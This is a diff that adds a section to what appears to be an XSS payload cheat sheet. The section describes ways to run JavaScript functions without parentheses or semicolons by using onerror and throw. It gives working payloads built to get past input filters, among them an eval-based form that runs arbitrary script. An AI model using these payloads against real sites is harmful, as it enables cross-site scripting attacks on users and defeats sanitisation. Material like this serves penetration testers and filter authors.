@@ -315,6 +315,38 @@ Payload: onerror=alert;throw 1
 
 
 
+                                                  ## XSS without parentheses and semi-colons
+# A few years ago I discovered a technique to call functions in JavaScript without parentheses using onerror and the throw statement.
+# It works by setting the onerror handler to the function you want to call and the throw statement is used to pass the argument to the function: 
+
+Payload: <script>onerror=alert;throw 1337</script>
+
+# The onerror handler is called every time a JavaScript exception is created, and the throw statement allows you to create a custom exception containing an expression which is sent to the onerror handler.
+# Because throw is a statement, you usually need to follow the onerror assignment with a semi-colon in order to begin a new statement and not form an expression. 
+
+# I encountered a site that was filtering parentheses and semi-colons, and I thought it must be possible to adapt this technique to execute a function without a semi-colon.
+# The first way is pretty straightforward: you can use curly braces to form a block statement in which you have your onerror assignment.
+# After the block statement you can use throw without a semi-colon (or new line):
+
+Payload: <script>{onerror=alert}throw 1337</script>
+
+# The block statement was good but I wanted a cooler alternative.
+# Interestingly, because the throw statement accepts an expression, you can do the onerror assignment inside the throw statement and because the last part of the expression is sent to the onerror handler the function will be called with the chosen arguments.
+
+Payload: <script>throw onerror=alert,'some string',123,'haha'</script>
+
+# If you've tried running the code you'll notice that Chrome prefixes the string sent to the exception handler with "Uncaught".
+# In my previous blog post I showed how it was possible to use eval as the exception handler and evaluate strings.
+
+# To recap you can prefix your string with an = which then makes the 'Uncaught' string a variable and executes arbitrary JavaScript
+
+For example: <script>{onerror=eval}throw'=alert\x281337\x29'</script>
+
+
+
+
+
+
 
 
 
